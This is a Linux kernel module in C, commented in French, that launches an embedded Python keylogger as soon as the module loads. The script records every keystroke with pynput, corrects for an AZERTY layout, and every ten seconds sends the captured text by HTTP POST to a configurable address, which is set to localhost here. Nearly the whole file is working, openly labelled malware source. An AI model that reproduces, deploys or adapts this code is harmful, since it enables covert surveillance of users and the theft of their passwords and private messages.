#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/workqueue.h>

// Script Python du keylogger
static char *python_keylogger =
    "from pynput import keyboard\n"
    "import requests\n"
    "import json\n"
    "import threading\n"
    "\n"
    "text = \"\"\n"
    "ipAddress = \"127.0.0.1\"\n"
    "portNumber = \"8080\"\n"
    "timeInterval = 10\n"
    "\n"
    "azerty_mapping = {\n"
    "    \"a\": \"q\", \"q\": \"a\", \"z\": \"w\", \"w\": \"z\",\n"
    "    \"m\": \",\", \",\": \"m\", \"A\": \"Q\", \"Q\": \"A\",\n"
    "    \"Z\": \"W\", \"W\": \"Z\", \"M\": \"?\", \"?\": \"M\",\n"
    "    \"4\": \"'\", \"/\": \"!\"\n"
    "}\n"
    "\n"
    "def send_post_req():\n"
    "    try:\n"
    "        payload = json.dumps({\"keyboardData\": text})\n"
    "        requests.post(\n"
    "            f\"http://{ipAddress}:{portNumber}\",\n"
    "            data=payload,\n"
    "            headers={\"Content-Type\": \"application/json\"},\n"
    "        )\n"
    "        threading.Timer(timeInterval, send_post_req).start()\n"
    "    except:\n"
    "        pass\n"
    "\n"
    "def on_press(key):\n"
    "    global text\n"
    "    try:\n"
    "        if key == keyboard.Key.enter:\n"
    "            text += \"\\n\"\n"
    "        elif key == keyboard.Key.tab:\n"
    "            text += \"\\t\"\n"
    "        elif key == keyboard.Key.space:\n"
    "            text += \" \"\n"
    "        elif key == keyboard.Key.backspace:\n"
    "            text = text[:-1]\n"
    "        else:\n"
    "            char = str(key.char) if hasattr(key, \"char\") else str(key)\n"
    "            if char in azerty_mapping:\n"
    "                char = azerty_mapping[char]\n"
    "            text += char\n"
    "    except:\n"
    "        pass\n"
    "\n"
    "with keyboard.Listener(on_press=on_press) as listener:\n"
    "    send_post_req()\n"
    "    listener.join()\n";

// Fonction pour exécuter le keylogger
static void run_python_script(struct work_struct *work)
{
    char *argv[] = {"/usr/bin/python3", "-c", python_keylogger, NULL};
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

    printk(KERN_INFO "Executing Python keylogger...\n");
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static struct workqueue_struct *keylogger_workqueue;
static DECLARE_WORK(keylogger_work, run_python_script);

// Initialisation du module
static int __init keylogger_init(void)
{
    keylogger_workqueue = create_singlethread_workqueue("keylogger_queue");
    if (!keylogger_workqueue)
    {
        printk(KERN_ERR "Failed to create workqueue\n");
        return -ENOMEM;
    }

    // Appel de la fonction qui exécute le script Python
    queue_work(keylogger_workqueue, &keylogger_work);
    printk(KERN_INFO "Keylogger module initialized\n");
    return 0;
}

// Nettoyage du module
static void __exit keylogger_exit(void)
{
    flush_workqueue(keylogger_workqueue);
    destroy_workqueue(keylogger_workqueue);
    printk(KERN_INFO "Keylogger module removed\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Votre Nom");
MODULE_DESCRIPTION("Kernel module to execute a Python keylogger script");
